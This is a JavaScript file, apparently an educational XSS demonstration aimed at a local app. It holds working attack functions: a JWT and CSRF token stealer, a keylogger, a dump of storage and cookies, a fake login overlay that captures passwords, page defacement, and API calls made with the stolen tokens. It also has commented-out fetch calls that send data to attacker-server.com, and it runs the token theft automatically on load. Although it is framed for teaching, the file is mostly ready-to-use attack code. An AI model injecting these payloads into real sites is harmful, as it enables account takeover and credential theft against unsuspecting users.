/**
 * evil.js - XSS Attack Demonstration Script
 * ⚠️ WARNING: This is for educational purposes only!
 * This demonstrates various XSS attack techniques that malicious actors use.
 * NEVER use these techniques maliciously.
 */

// Attack #1: Steal JWT Token from localStorage
function stealJWTToken() {
  const token = localStorage.getItem("jwt_token");
  const csrfToken = localStorage.getItem("csrf_token");

  if (token) {
    console.log("🔴 STOLEN JWT TOKEN:", token);
    console.log("🔴 STOLEN CSRF TOKEN:", csrfToken);

    // In a real attack, this would send to attacker's server
    // fetch('https://attacker-server.com/steal', {
    //   method: 'POST',
    //   body: JSON.stringify({
    //     jwt: token,
    //     csrf: csrfToken,
    //     victim: window.location.href,
    //     cookies: document.cookie
    //   })
    // });

    alert(
      `🚨 XSS ATTACK SUCCESSFUL!\n\nStolen Tokens:\nJWT: ${token}\nCSRF: ${csrfToken}`
    );
  }
}

// Attack #2: Keylogger
function installKeylogger() {
  console.log("🔴 Installing keylogger...");

  let capturedKeys = "";
  document.addEventListener("keypress", function (e) {
    capturedKeys += e.key;
    console.log("🔴 Key captured:", e.key);

    // Send captured data every 10 keystrokes
    if (capturedKeys.length >= 10) {
      console.log("🔴 Sending captured keys:", capturedKeys);
      // fetch('https://attacker-server.com/keylog', {
      //   method: 'POST',
      //   body: JSON.stringify({ keys: capturedKeys })
      // });
      capturedKeys = "";
    }
  });

  alert("⌨️ Keylogger installed! Check console to see captured keys.");
}

// Attack #3: Session Hijacking
function hijackSession() {
  const allData = {
    localStorage: {},
    sessionStorage: {},
    cookies: document.cookie,
    userAgent: navigator.userAgent,
    location: window.location.href,
  };

  // Steal all localStorage data
  for (let key in localStorage) {
    allData.localStorage[key] = localStorage.getItem(key);
  }

  // Steal all sessionStorage data
  for (let key in sessionStorage) {
    allData.sessionStorage[key] = sessionStorage.getItem(key);
  }

  console.log("🔴 HIJACKED SESSION DATA:", allData);
  alert("🔓 Session hijacked! Check console for stolen data.");
}

// Attack #4: Fake Login Form Injection
function injectFakeLoginForm() {
  const fakeForm = document.createElement("div");
  fakeForm.innerHTML = `
    <div style="
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0,0,0,0.8);
      z-index: 10000;
      display: flex;
      align-items: center;
      justify-content: center;
    ">
      <div style="
        background: white;
        padding: 30px;
        border-radius: 8px;
        box-shadow: 0 0 20px rgba(0,0,0,0.3);
      ">
        <h2 style="margin-top: 0;">Session Expired - Please Login Again</h2>
        <form id="fakeLoginForm">
          <input 
            type="text" 
            placeholder="Username" 
            id="fakeUsername"
            style="
              display: block;
              width: 250px;
              padding: 10px;
              margin: 10px 0;
              border: 1px solid #ddd;
              border-radius: 4px;
            "
          />
          <input 
            type="password" 
            placeholder="Password" 
            id="fakePassword"
            style="
              display: block;
              width: 250px;
              padding: 10px;
              margin: 10px 0;
              border: 1px solid #ddd;
              border-radius: 4px;
            "
          />
          <button 
            type="submit"
            style="
              background: #007bff;
              color: white;
              border: none;
              padding: 10px 20px;
              border-radius: 4px;
              cursor: pointer;
              width: 100%;
            "
          >
            Login
          </button>
        </form>
      </div>
    </div>
  `;

  document.body.appendChild(fakeForm);

  document
    .getElementById("fakeLoginForm")
    .addEventListener("submit", function (e) {
      e.preventDefault();
      const username = document.getElementById("fakeUsername").value;
      const password = document.getElementById("fakePassword").value;

      console.log("🔴 STOLEN CREDENTIALS:", { username, password });
      alert(
        `🎣 Phishing Success!\nUsername: ${username}\nPassword: ${password}`
      );

      document.body.removeChild(fakeForm);
    });
}

// Attack #5: Modify Page Content
function deface() {
  document.body.style.background = "red";
  document.querySelector("h1").textContent = "🏴‍☠️ HACKED BY XSS 🏴‍☠️";

  // Add fake warning
  const warning = document.createElement("div");
  warning.style.cssText = `
    position: fixed;
    top: 20px;
    right: 20px;
    background: yellow;
    color: black;
    padding: 20px;
    border: 3px solid red;
    font-weight: bold;
    z-index: 10000;
  `;
  warning.textContent = "⚠️ This site has been compromised!";
  document.body.appendChild(warning);
}

// Attack #6: Make unauthorized API calls
async function makeUnauthorizedCall() {
  const token = localStorage.getItem("jwt_token");
  const csrfToken = localStorage.getItem("csrf_token");

  if (token) {
    try {
      // Use the stolen tokens to make API calls
      const response = await fetch("http://localhost:4000/api/protected", {
        method: "POST",
        headers: {
          Authorization: `Bearer ${token}`,
          "X-CSRF-Token": csrfToken,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          message: "Called by XSS attack!",
          malicious: true,
        }),
      });

      const data = await response.json();
      console.log("🔴 Unauthorized API call successful:", data);
      alert("📡 Made unauthorized API call using stolen tokens!");
    } catch (error) {
      console.error("API call failed:", error);
    }
  }
}

// Attack #7: Cookie Theft Attempt
function attemptCookieTheft() {
  const cookies = document.cookie;
  console.log("🍪 Attempting to steal cookies...");
  console.log("Available cookies:", cookies || "No cookies accessible");

  if (!cookies) {
    alert(
      "✅ Good news! No cookies are accessible via JavaScript.\nThis means httpOnly cookies are being used correctly!"
    );
  } else {
    alert(`🔴 Cookies stolen: ${cookies}`);
  }
}

// Main XSS Attack Dashboard
function createAttackDashboard() {
  const dashboard = document.createElement("div");
  dashboard.id = "xss-attack-dashboard";
  dashboard.style.cssText = `
    position: fixed;
    bottom: 20px;
    right: 20px;
    background: #333;
    color: white;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 0 20px rgba(0,0,0,0.5);
    z-index: 10000;
    max-width: 300px;
  `;

  dashboard.innerHTML = `
    <h3 style="margin-top: 0; color: red;">🔴 XSS Attack Console</h3>
    <p style="font-size: 12px; opacity: 0.8;">Educational Demo Only!</p>
    <button onclick="stealJWTToken()" style="display: block; width: 100%; margin: 5px 0; padding: 8px; background: #ff4444; border: none; color: white; cursor: pointer; border-radius: 4px;">
      Steal JWT Token
    </button>
    <button onclick="installKeylogger()" style="display: block; width: 100%; margin: 5px 0; padding: 8px; background: #ff6b6b; border: none; color: white; cursor: pointer; border-radius: 4px;">
      Install Keylogger
    </button>
    <button onclick="hijackSession()" style="display: block; width: 100%; margin: 5px 0; padding: 8px; background: #ff8787; border: none; color: white; cursor: pointer; border-radius: 4px;">
      Hijack Session
    </button>
    <button onclick="injectFakeLoginForm()" style="display: block; width: 100%; margin: 5px 0; padding: 8px; background: #ffa502; border: none; color: white; cursor: pointer; border-radius: 4px;">
      Inject Fake Login
    </button>
    <button onclick="deface()" style="display: block; width: 100%; margin: 5px 0; padding: 8px; background: #ff6348; border: none; color: white; cursor: pointer; border-radius: 4px;">
      Deface Page
    </button>
    <button onclick="makeUnauthorizedCall()" style="display: block; width: 100%; margin: 5px 0; padding: 8px; background: #ee5a24; border: none; color: white; cursor: pointer; border-radius: 4px;">
      Make Unauthorized API Call
    </button>
    <button onclick="attemptCookieTheft()" style="display: block; width: 100%; margin: 5px 0; padding: 8px; background: #c44569; border: none; color: white; cursor: pointer; border-radius: 4px;">
      Attempt Cookie Theft
    </button>
    <button onclick="document.body.removeChild(document.getElementById('xss-attack-dashboard'))" style="display: block; width: 100%; margin: 10px 0 0 0; padding: 8px; background: #666; border: none; color: white; cursor: pointer; border-radius: 4px;">
      Close Attack Console
    </button>
  `;

  document.body.appendChild(dashboard);
}

// Make functions globally available for onclick handlers
window.stealJWTToken = stealJWTToken;
window.installKeylogger = installKeylogger;
window.hijackSession = hijackSession;
window.injectFakeLoginForm = injectFakeLoginForm;
window.deface = deface;
window.makeUnauthorizedCall = makeUnauthorizedCall;
window.attemptCookieTheft = attemptCookieTheft;

// Auto-execute: Create attack dashboard when script loads
console.log("🔴 XSS Attack Script Loaded!");
console.log("💀 Creating attack dashboard...");
createAttackDashboard();

// Optional: Auto-steal tokens after 2 seconds
setTimeout(() => {
  console.log("🔴 Auto-executing token theft...");
  stealJWTToken();
}, 2000);
